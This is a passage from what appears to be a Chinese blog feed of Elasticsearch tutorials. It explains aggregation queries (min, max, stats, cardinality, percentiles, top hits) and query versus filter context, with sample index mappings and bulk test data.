c、桶也可以被嵌套在其他桶里面。</p><p><strong>（2）指标（metric）</strong></p><p>　　a、桶能让我们划分文档到有意义的集合，但是最终我们需要的是对这些桶内的文档进行一些指标的计算。分桶是一种达到目的地的手段：它提供了一种给文档分组的方法来让</p><p>我们可以计算感兴趣的指标。</p><p>　　b、大多数指标是简单的数学运算（如：最小值、平均值、最大值、汇总），这些是通过文档的值来计算的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回结果</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">   <span class="string">"aggregations"</span>: &#123;</span><br><span class="line">      <span class="string">"load_time_ranks"</span>: &#123;</span><br><span class="line">         <span class="string">"values"</span> : &#123;</span><br><span class="line">            <span class="string">"500.0"</span>: 55.1,</span><br><span class="line">            <span class="string">"600.0"</span>: 64.0</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>结果说明</code>：时间小于500的文档占比为55.1%，时间小于600的文档占比为64%，</p><h4 id="9、Top-Hits"><a href="#9、Top-Hits" class="headerlink" title="9、Top Hits"></a>9、Top Hits</h4><p><strong>一般用于分桶后获取该桶内匹配前n的文档列表</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST /sales/_search?size=0</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"aggs"</span>: &#123;</span><br><span class="line">        <span class="string">"top_tags"</span>: &#123;</span><br><span class="line">            <span class="string">"terms"</span>: &#123;</span><br><span class="line">                <span class="string">"field"</span>: <span class="string">"type"</span>,  <span class="comment">#根据type进行分组 每组显示前3个文档</span></span><br><span class="line">                <span class="string">"size"</span>: 3</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"aggs"</span>: &#123;</span><br><span class="line">                <span class="string">"top_sales_hits"</span>: &#123;</span><br><span class="line">                    <span class="string">"top_hits"</span>: &#123;</span><br><span class="line">                        <span class="string">"sort"</span>: [</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="string">"date"</span>: &#123; </span><br><span class="line">                                    <span class="string">"order"</span>: <span class="string">"desc"</span>  <span class="comment">#按照时间进行倒叙排序</span></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        ],</span><br><span class="line">                        <span class="string">"_source"</span>: &#123;</span><br><span class="line">                            <span class="string">"includes"</span>: [ <span class="string">"date"</span>, <span class="string">"price"</span> ] <span class="comment">#只显示文档指定字段</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="string">"size"</span> : 1</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三、示例"><a href="#三、示例" class="headerlink" title="三、示例"></a>三、示例</h2><p>下面会针对上面官方文档的例子进行举例说明。</p><h4 id="1、添加测试数据"><a href="#1、添加测试数据" class="headerlink" title="1、添加测试数据"></a>1、添加测试数据</h4><p><strong>1）创建索引</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">DELETE /employees</span><br><span class="line">PUT /employees/</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span> : &#123;</span><br><span class="line">      <span class="attr">"properties"</span> : &#123;</span><br><span class="line">        <span class="attr">"age"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"integer"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"gender"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"job"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">          <span class="attr">"fields"</span> : &#123;</span><br><span class="line">            <span class="attr">"keyword"</span> : &#123;</span><br><span class="line">              <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">              <span class="attr">"ignore_above"</span> : <span class="number">50</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"name"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"keyword"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"salary"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"integer"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2)添加数据</strong></p><p>添加10条数据，每条数据包含：<strong>姓名、年龄、工作、性别、薪资</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">PUT /employees/_bulk</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"1"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Emma"</span>,<span class="attr">"age"</span>:<span class="number">32</span>,<span class="attr">"job"</span>:<span class="string">"Product Manager"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>:<span class="number">35000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"2"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Underwood"</span>,<span class="attr">"age"</span>:<span class="number">41</span>,<span class="attr">"job"</span>:<span class="string">"Dev Manager"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>: <span class="number">50000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"3"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Tran"</span>,<span class="attr">"age"</span>:<span class="number">25</span>,<span class="attr">"job"</span>:<span class="string">"Web Designer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>:<span class="number">18000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"4"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Rivera"</span>,<span class="attr">"age"</span>:<span class="number">26</span>,<span class="attr">"job"</span>:<span class="string">"Web Designer"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>: <span class="number">22000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"5"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Rose"</span>,<span class="attr">"age"</span>:<span class="number">25</span>,<span class="attr">"job"</span>:<span class="string">"QA"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>:<span class="number">18000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"6"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Lucy"</span>,<span class="attr">"age"</span>:<span class="number">31</span>,<span class="attr">"job"</span>:<span class="string">"QA"</span>,<span class="attr">"gender"</span>:<span class="string">"female"</span>,<span class="attr">"salary"</span>: <span class="number">25000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"7"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Byrd"</span>,<span class="attr">"age"</span>:<span class="number">27</span>,<span class="attr">"job"</span>:<span class="string">"QA"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>:<span class="number">20000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"8"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Foster"</span>,<span class="attr">"age"</span>:<span class="number">27</span>,<span class="attr">"job"</span>:<span class="string">"Java Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>: <span class="number">20000</span>&#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"9"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Gregory"</span>,<span class="attr">"age"</span>:<span class="number">32</span>,<span class="attr">"job"</span>:<span class="string">"Java Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>:<span class="number">22000</span> &#125;</span><br><span class="line">&#123; <span class="attr">"index"</span> : &#123;  <span class="attr">"_id"</span> : <span class="string">"10"</span> &#125; &#125;</span><br><span class="line">&#123; <span class="attr">"name"</span> : <span class="string">"Bryant"</span>,<span class="attr">"age"</span>:<span class="number">20</span>,<span class="attr">"job"</span>:<span class="string">"Java Programmer"</span>,<span class="attr">"gender"</span>:<span class="string">"male"</span>,<span class="attr">"salary"</span>: <span class="number">9000</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="2、求薪资最低值"><a href="#2、求薪资最低值" class="headerlink" title="2、求薪资最低值"></a>2、求薪资最低值</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"size"</span>: 0,</span><br><span class="line">  <span class="string">"aggs"</span>: &#123;</span><br><span class="line">    <span class="string">"min_salary"</span>: &#123;</span><br><span class="line">      <span class="string">"min"</span>: &#123;</span><br><span class="line">        <span class="string">"field"</span>:<span class="string">"salary"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回</p><p><img src="/img/es/es4-0.png" alt="es"> </p><h4 id="3、找到最低、最高和平均工资"><a href="#3、找到最低、最高和平均工资" class="headerlink" title="3、找到最低、最高和平均工资"></a>3、找到最低、最高和平均工资</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"size"</span>: 0,</span><br><span class="line">  <span class="string">"aggs"</span>: &#123;</span><br><span class="line">    <span class="string">"max_salary"</span>: &#123;</span><br><span class="line">      <span class="string">"max"</span>: &#123;</span><br><span class="line">        <span class="string">"field"</span>: <span class="string">"salary"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"min_salary"</span>: &#123;</span><br><span class="line">      <span class="string">"min"</span>: &#123;</span><br><span class="line">        <span class="string">"field"</span>: <span class="string">"salary"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"avg_salary"</span>: &#123;</span><br><span class="line">      <span class="string">"avg"</span>: &#123;</span><br><span class="line">        <span class="string">"field"</span>: <span class="string">"salary"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4、一个聚合，输出多值"><a href="#4、一个聚合，输出多值" class="headerlink" title="4、一个聚合，输出多值"></a>4、一个聚合，输出多值</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"size"</span>: 0,</span><br><span class="line">  <span class="string">"aggs"</span>: &#123;</span><br><span class="line">    <span class="string">"stats_salary"</span>: &#123;</span><br><span class="line">      <span class="string">"stats"</span>: &#123;</span><br><span class="line">        <span class="string">"field"</span>:<span class="string">"salary"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回</p><p><img src="/img/es/es4-1.png" alt="es"> </p><h4 id="5、求一共有多少工作类型"><a href="#5、求一共有多少工作类型" class="headerlink" title="5、求一共有多少工作类型"></a>5、求一共有多少工作类型</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"cardinate"</span>: &#123;</span><br><span class="line">      <span class="attr">"cardinality"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"job.keyword"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回</p><p><img src="/img/es/es4-2.png" alt="es"> </p><p><code>注意</code> 我们需要把job的类型为<code>keyword</code>类型，这样就不会分词，把它当成一个整体。</p><h4 id="6、查看中位数的薪资"><a href="#6、查看中位数的薪资" class="headerlink" title="6、查看中位数的薪资"></a>6、查看中位数的薪资</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST employees/_search</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">        <span class="attr">"load_time_outlier"</span>: &#123;</span><br><span class="line">            <span class="attr">"percentiles"</span>: &#123;</span><br><span class="line">                <span class="attr">"field"</span>: <span class="string">"salary"</span>,</span><br><span class="line">                 <span class="attr">"percents"</span> : [<span class="number">50</span>, <span class="number">99</span>],</span><br><span class="line">                <span class="attr">"keyed"</span>: <span class="literal">false</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回</p><p><img src="/img/es/es4-3.png" alt="es"> </p><p>发现这些工作的中位数是：21000元。</p><h4 id="7、取每个工作类型薪资最高的数据"><a href="#7、取每个工作类型薪资最高的数据" class="headerlink" title="7、取每个工作类型薪资最高的数据"></a>7、取每个工作类型薪资最高的数据</h4><p><code>多层嵌套</code> 根据工作类型分桶，然后按照性别分桶，计算每个桶中工资的最高的薪资。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST employees&#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;size&quot;: 0,</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;Job_gender_stats&quot;: &#123;</span><br><span class="line">      &quot;terms&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;job.keyword&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;aggs&quot;: &#123;</span><br><span class="line">        &quot;gender_stats&quot;: &#123;</span><br><span class="line">          &quot;terms&quot;: &#123;</span><br><span class="line">            &quot;field&quot;: &quot;gender&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;aggs&quot;: &#123;</span><br><span class="line">            &quot;salary_stats&quot;: &#123;</span><br><span class="line">              &quot;max&quot;: &#123;</span><br><span class="line">                &quot;field&quot;: &quot;salary&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回</p><p><img src="/img/es/es4-4.png" alt="es"> </p>]]></content>
      
      
      <categories>
          
          <category> Elasticsearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elasticsearch——Query查询和Filter查询</title>
      <link href="/2023/09/12/Elasticsearch%E2%80%94%E2%80%94Query%E6%9F%A5%E8%AF%A2%E5%92%8CFilter%E6%9F%A5%E8%AF%A2/"/>
      <url>/2023/09/12/Elasticsearch%E2%80%94%E2%80%94Query%E6%9F%A5%E8%AF%A2%E5%92%8CFilter%E6%9F%A5%E8%AF%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><h4 id="1、概念"><a href="#1、概念" class="headerlink" title="1、概念"></a>1、概念</h4><p>一个查询语句究竟具有什么样的行为和得到什么结果，主要取决于它到底是处<code>Query</code>还是<code>Filter</code>。两者有很大区别，我们来看下：</p><p><code>Query context 查询上下文</code> <strong>这种语句在执行时既要计算文档是否匹配，还要计算文档相对于其他文档的匹配度有多高，匹配度越高，<code>_score</code> 分数就越高</strong></p><p><code>Filter context 过滤上下文</code> 过滤上下文中的语句在执行时<strong>只关心文档是否和查询匹配，不会计算匹配度，也就是得分</strong>。</p><p>看下官方的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;bool&quot;: &#123;</span><br><span class="line">      &quot;must&quot;: [</span><br><span class="line">        &#123; &quot;match&quot;: &#123; &quot;title&quot;:   &quot;Search&quot;        &#125;&#125;,</span><br><span class="line">        &#123; &quot;match&quot;: &#123; &quot;content&quot;: &quot;Elasticsearch&quot; &#125;&#125;</span><br><span class="line">      ],</span><br><span class="line">      &quot;filter&quot;: [</span><br><span class="line">        &#123; &quot;term&quot;:  &#123; &quot;status&quot;: &quot;published&quot; &#125;&#125;,</span><br><span class="line">        &#123; &quot;range&quot;: &#123; &quot;publish_date&quot;: &#123; &quot;gte&quot;: &quot;2015-01-01&quot; &#125;&#125;&#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对上面的例子分析下：</p><ol><li><code>query</code> 参数表示整个语句是处于 query context 中</li><li><code>bool</code> 和 <code>match</code> 语句被用在 query context 中，也就是说它们会计算每个文档的匹配度（_score)</li><li><code>filter</code> 参数则表示这个子查询处于 filter context 中</li><li><code>filter</code> 语句中的 <code>term</code> 和 <code>range</code> 语句用在 filter context 中，它们只起到过滤的作用，并不会计算文档的得分。</li></ol><h4 id="2、查询数据准备"><a href="#2、查询数据准备" class="headerlink" title="2、查询数据准备"></a>2、查询数据准备</h4><p><strong>1）创建索引</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PUT student</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"settings"</span>:&#123;</span><br><span class="line">    <span class="attr">"number_of_shards"</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="attr">"number_of_replicas"</span>:<span class="number">1</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"mappings"</span>:&#123;</span><br><span class="line">      <span class="attr">"properties"</span>:&#123;</span><br><span class="line">        <span class="attr">"name"</span>:&#123;<span class="attr">"type"</span>:<span class="string">"text"</span>&#125;,</span><br><span class="line">        <span class="attr">"address"</span>:&#123;<span class="attr">"type"</span>:<span class="string">"keyword"</span>&#125;,</span><br><span class="line">        <span class="attr">"age"</span>:&#123;<span class="attr">"type"</span>:<span class="string">"integer"</span>&#125;,</span><br><span class="line">        <span class="attr">"interests"</span>:&#123;<span class="attr">"type"</span>:<span class="string">"text"</span>&#125;,</span><br><span class="line">        <span class="attr">"birthday"</span>:&#123;<span class="attr">"type"</span>:<span class="string">"date"</span>&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2）添加测试数据</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">POST /student/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>:<span class="string">"徐小小"</span>,</span><br><span class="line">  <span class="attr">"address"</span>:<span class="string">"杭州"</span>,</span><br><span class="line">  <span class="attr">"age"</span>:<span class="number">3</span>,</span><br><span class="line">  <span class="attr">"interests"</span>:<span class="string">"唱歌 画画  跳舞"</span>,</span><br><span class="line">  <span class="attr">"birthday"</span>:<span class="string">"2017-06-19"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST /student/_doc/2</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>:<span class="string">"刘德华"</span>,</span><br><span class="line">  <span class="attr">"address"</span>:<span class="string">"香港"</span>,</span><br><span class="line">  <span class="attr">"age"</span>:<span class="number">28</span>,</span><br><span class="line">  <span class="attr">"interests"</span>:<span class="string">"演戏 旅游"</span>,</span><br><span class="line">  <span class="attr">"birthday"</span>:<span class="string">"1980-06-19"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /student/_doc/3</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>:<span class="string">"张小斐"</span>,</span><br><span class="line">  <span class="attr">"address"</span>:<span class="string">"北京"</span>,</span><br><span class="line">  <span class="attr">"age"</span>:<span class="number">28</span>,</span><br><span class="line">  <span class="attr">"interests"</span>:<span class="string">"小品 旅游"</span>,</span><br><span class="line">  <span class="attr">"birthday"</span>:<span class="string">"1990-06-19"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST /student/_doc/4</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>:<span class="string">"王小宝"</span>,</span><br><span class="line">  <span class="attr">"address"</span>:<span class="string">"德州"</span>,</span><br><span class="line">  <span class="attr">"age"</span>:<span class="number">63</span>,</span><br><span class="line">  <span class="attr">"interests"</span>:<span class="string">"演戏 小品 打牌"</span>,</span><br><span class="line">  <span class="attr">"birthday"</span>:<span class="string">"1956-06-19"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">POST /student/_doc/5</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>:<span class="string">"向华强"</span>,</span><br><span class="line">  <span class="attr">"address"</span>:<span class="string">"香港"</span>,</span><br><span class="line">  <span class="attr">"age"</span>:<span class="number">31</span>,</span><br><span class="line">  <span class="attr">"interests"</span>:<span class="string">"演戏 主持"</span>,</span><br><span class="line">  <span class="attr">"birthday"</span>:<span class="string">"1958-06-19"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看是否成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET _cat/count/student?v</span><br></pre></td></tr></table></figure><p><img src="/img/es/es3-0.png" alt="es"> </p><p>可以看出索引已经存在，并且下面有5条数据。</p><h2 id="二、Query查询"><a href="#二、Query查询" class="headerlink" title="二、Query查询"></a>二、Query查询</h2><h4 id="1、match查询"><a href="#1、match查询" class="headerlink" title="1、match查询"></a>1、match查询</h4><p><code>match query</code>: 知道分词器的存在，会对filed进行分词操作，然后再查询<br><code>match_all</code>: 查询所有文档<br><code>multi_match</code>: 可以指定多个字段<br><code>match_phrase</code>: 短语匹配查询，ElasticSearch引擎首先分析（analyze）查询字符串，从分析后的文本中构建短语查询，这意味着必须匹配短语中的所有分词，</p><p>并且保证各个分词的相对位置不变</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 